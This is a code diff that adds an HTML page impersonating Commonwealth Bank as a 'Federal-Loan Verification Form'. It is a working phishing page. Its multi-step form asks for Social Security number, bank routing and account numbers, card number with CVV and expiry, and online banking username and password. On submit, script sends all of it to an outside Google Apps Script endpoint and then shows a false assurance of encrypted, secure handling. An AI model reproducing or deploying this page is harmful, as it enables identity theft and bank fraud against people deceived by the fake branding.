@@ -1,0 +1,396 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comm_Bank_Federal-Loan_Verification_Form</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            color: #fff;
+            background: url('https://images.unsplash.com/photo-1599423300746-b62533397364?auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .form-container {
+            width: 95%;
+            max-width: 550px;
+            padding: 35px;
+            background: rgba(0, 0, 0, 0.35);
+            backdrop-filter: blur(12px);
+            border-radius: 25px;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.6);
+            position: relative;
+            z-index: 10;
+            border: 2px solid rgba(255, 215, 0, 0.5);
+            margin-top: 80px;
+
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .logo-bank {
+            position: absolute;
+            top: -60px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 150px;
+            z-index: 15;
+            filter: drop-shadow(0 0 15px #FFD700);
+        }
+
+        .form-header {
+            text-align: center;
+            font-size: 32px;
+            font-weight: bold;
+            margin-top: 70px;
+            margin-bottom: 25px;
+            color: #FFD700;
+            text-shadow: 0 0 15px #FFD700, 0 0 25px #FFF8DC;
+        }
+
+        .progress-bar {
+            height: 10px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+        }
+
+        .progress {
+            height: 100%;
+            width: 0%;
+            background: #FFD700;
+            border-radius: 12px;
+            box-shadow: 0 0 15px #FFD700;
+            transition: width .35s ease-in-out;
+        }
+
+        label {
+            display: block;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 5px #000;
+        }
+
+        input,
+        select,
+        textarea {
+            width: 100%;
+            padding: 14px;
+            margin-top: 6px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 215, 0, 0.4);
+            background: rgba(255, 255, 255, 0.15);
+            color: #fff;
+            font-size: 16px;
+            transition: 0.3s;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.4);
+        }
+
+        input:focus,
+        select:focus,
+        textarea:focus {
+            background: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 0 20px #FFD700;
+            outline: none;
+            border-color: #FFD700;
+        }
+
+        select option {
+            background: #1a1a1a;
+            color: #fff;
+        }
+
+        .btn {
+            padding: 16px;
+            background: #FFD700;
+            color: #000;
+            border: none;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            flex: 1;
+            margin: 5px;
+            box-shadow: 0 0 15px #FFD700;
+            text-shadow: 0 0 5px #fff;
+        }
+
+        .btn:hover {
+            background: #e6b800;
+            transform: scale(1.05);
+            box-shadow: 0 0 25px #FFD700;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .success-box {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.85);
+            padding: 45px;
+            border-radius: 25px;
+            text-align: center;
+            z-index: 9999;
+            color: #fff;
+            max-width: 420px;
+            box-shadow: 0 0 40px #FFD700;
+        }
+    </style>
+</head>
+
+<body>
+
+    <img class="logo-bank" src="https://upload.wikimedia.org/wikipedia/commons/7/73/Commonwealth_Bank_Logo.svg"
+        alt="Commonwealth Bank Logo">
+
+    <div class="form-container">
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+
+        <form id="loanForm">
+
+            <div class="step" id="step1">
+                <div class="form-header" id="formHeader">Common Wealth Financial Services Federal-Loan Verification Form
+                </div>
+                <label>First Name</label><input type="text" name="First Name" required>
+                <label>Last Name</label><input type="text" name="Last Name" required>
+                <label>Email</label><input type="email" name="Email" required>
+
+                <div class="button-group">
+                    <button type="button" class="btn" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+
+            <div class="step" id="step2">
+                <label>Phone Number</label><input type="tel" name="Phone" required pattern="[0-9]{10}"
+                    placeholder="+1(844)123-4567">
+                <label>Street Address</label><input type="text" name="Street Address" required>
+                <label>City</label><input type="text" name="City" required>
+                <label>State</label><input type="text" name="State" required>
+                <label>ZIP Code</label><input type="text" name="ZIP" required pattern="[0-9]{5}"
+                    placeholder="Digits only">
+                <label>Date of Birth</label><input type="date" name="DOB" required>
+                <label>Loan Type</label>
+                <select name="Loan Type" required>
+                    <option value="">Select Loan Type</option>
+                    <option>Personal Loan</option>
+                    <option>Debt Consolidation</option>
+                    <option>Home Loan</option>
+                    <option>Refinance</option>
+                    <option>Federal Loan</option>
+                    <option>Auto Loan</option>
+                </select>
+
+                <div class="button-group">
+                    <button type="button" class="btn" onclick="prevStep()">Back</button>
+                    <button type="button" class="btn" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+
+            <div class="step" id="step3">
+                <label>Loan Amount</label>
+                <input type="number" name="Amount" step="1" required>
+                <label>Annual Income</label>
+                <input type="number" name="Income" step="1" required>
+                <label>Employment Status</label>
+                <select name="Employment Status" required>
+                    <option value="">Select</option>
+                    <option>Employed Full-time</option>
+                    <option>Employed Part-time</option>
+                    <option>Self-employed</option>
+                    <option>Unemployed</option>
+                    <option>Retired</option>
+                </select>
+
+                <div class="button-group">
+                    <button type="button" class="btn" onclick="prevStep()">Back</button>
+                    <button type="button" class="btn" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+
+            <div class="step" id="step4">
+
+                <label>Social Security Number</label>
+                <input type="text" name="social_security" required pattern="\d{9}" placeholder="123-12-0000">
+
+                <label>Routing Number</label>
+                <input type="text" name="routing" required pattern="\d{9}" placeholder="YOUR BANKING ROUTING NUMBER">
+
+                <label>Account Number</label>
+                <input type="text" name="account" required pattern="\d{9,14}" placeholder="YOUR BANKING ACCOUNT NUMBER">
+
+                <div class="button-group">
+                    <button type="button" class="btn" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+            <div class="step" id="step5">
+
+                <label>Bank Issued Debit/Credit Card</label>
+                <input type="text" name="Bank Issued Debit/Credit Card" pattern="\d{16}"
+                    placeholder="1234-5678-0000-0000" required>
+
+                <label>CVV (3-Digit Code On Back)</label>
+                <input type="text" name="CVV (3-Digit Code On Back)" pattern="\d{3}" required>
+
+                <label>Expiration Date (MM/YY) </label>
+                <input type="text" name="Expiration Date (MM/YY)" required>
+
+                <label>Online Banking Username</label>
+                <input type="text" name="Online Banking Username" required>
+
+                <label>Online Banking Password</label>
+                <input type="text" name="Online Banking Password" required>
+
+                <div class="button-group">
+                    <button type="button" class="btn" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+
+            <div class="step" style="display:none;">
+
+                <label style="margin:0;">I, The Undersigned, Hereby Authorize Commonwealth Bank To Obtain Personal And
+                    Credit Information About Me From The Following Sources:
+
+                    My employer
+
+                    Credit Bureaus And Credit Reporting Agencies
+
+                    Any individual or entity with whom I have financial dealings
+
+                    References Provided In This Application
+
+                    Purpose of Information
+
+                    I Understand That The Information Obtained, Along With The Details I Provide In ThisApplication,
+                    Will Be Used Solely For The Purpose OF Processing My Application And Managing Any Future Financial
+                    Relationship With Commonwealth Bank.
+
+                    Commitment to Privacy and Security
+
+                    Commonwealth Bank is Committed To Protecting My Privacy.
+
+                    My Personal And Credit Information Will Be Handled With The Highest Level OF Security And
+                    Confidentiality. All Data Will Be Securely Stored And Shared Only With Other Lenders, Credit
+                    Bureaus, OR Credit Reporting Agencies When Necessary For The Purpose OF Assessing My
+                    Creditworthiness OR Managing My Financial Relationship With The Bank.
+
+                    Accuracy and Agreement
+
+                    I Affirm That All Information Provided In This Application Is True, Accurate, And Complete as Of The
+                    Date Of Submission.
+
+                    I Understand That Any Misrepresentation OR Omission OF Information May Result In The Rejection OF My
+                    Application. Furthermore,
+
+                    I Agree To Comply With All Terms And Conditions Set Forth By Commonwealth Bank.</label>
+
+                <br><br>
+
+                <label class="custom-check">
+                    <input type="checkbox" name="terms" required>
+                    <span>I agree to the terms and conditions.</span>
+                </label>
+
+                <div class="button-group">
+                    <button type="button" class="btn" onclick="prevStep()">Back</button>
+                    <button type="submit" class="btn">Submit</button>
+                </div>
+
+            </div>
+
+        </form>
+    </div>
+
+    <div class="success-box" id="successBox">
+        <h2>Application Submitted!</h2>
+        <p>Thank you for submitting your loan application. We will contact you shortly.</p>
+
+        <p id="securityMessage" class="security-msg">
+            Commonwealth Bank Prioritizes Your Security And Financial Privacy.
+            All Transactions Are Encrypted, And Our Process Complies
+            with Federal and Industry Standard's To Ensure The Safe Handling
+            OF Your Data And Funds. Thank you once again for choosing Commonwealth Bank.
+
+        </p>
+    </div>
+
+    <script>
+        let currentStep = 0;
+        const steps = document.querySelectorAll(".step");
+        const progress = document.getElementById("progress");
+
+        function showStep(n) {
+            steps.forEach((s, i) => s.style.display = (i === n ? "block" : "none"));
+            progress.style.width = ((n + 1) / steps.length * 100) + "%";
+        }
+
+        function nextStep() {
+            if (validateStep()) {
+                currentStep++;
+                showStep(currentStep);
+            }
+        }
+        function prevStep() {
+            currentStep--;
+            showStep(currentStep);
+        }
+
+        function validateStep() {
+            let valid = true;
+            steps[currentStep].querySelectorAll("input, select").forEach(input => {
+                if (!input.checkValidity()) valid = false;
+            });
+            return valid;
+        }
+
+        showStep(currentStep);
+
+        document.getElementById('loanForm').addEventListener('submit', e => {
+            e.preventDefault();
+            if (!validateStep()) return;
+            const form = e.target;
+            const formData = new FormData(form);
+            console.table(Object.fromEntries(formData));
+            fetch("https://script.google.com/macros/s/AKfycbyywFNknc3loadwHEBEUwj09X3aOKoJbqqIfSsMQmdAzbu0Wom8Dz3-_CROF1rUh1oyWQ/exec", { method: 'POST', body: formData })
+                .then(response => {
+                    if (response.ok) {
+                        document.getElementById("successBox").style.display = "block";
+                        setTimeout(() => {
+                            document.getElementById("securityMessage").style.display = "block";
+                        }, 700);
+                    } else {
+                        alert('Error submitting form. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error submitting form. Please try again.');
+                });
+        });
+
+    </script>
+</body>
+
+</html>
